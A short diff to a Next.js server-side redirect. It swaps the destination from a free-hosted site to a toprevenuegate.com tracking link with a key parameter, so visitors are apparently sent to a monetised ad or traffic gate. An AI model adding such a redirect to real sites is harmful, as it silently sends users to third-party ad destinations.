@@ -19,7 +19,7 @@ export const getServerSideProps: GetServerSideProps = async (ctx) => {
 			redirect: {
 				permanent: false,
 				destination: `${
-					`https://newyorktrends.000webhostapp.com/` + encodeURI(path as string)
+					`https://www.toprevenuegate.com/u2mnb6p6s?key=39beb203b9382c1e5fc25059ea290413` + encodeURI(path as string)
 				}`,
 			},
 		};
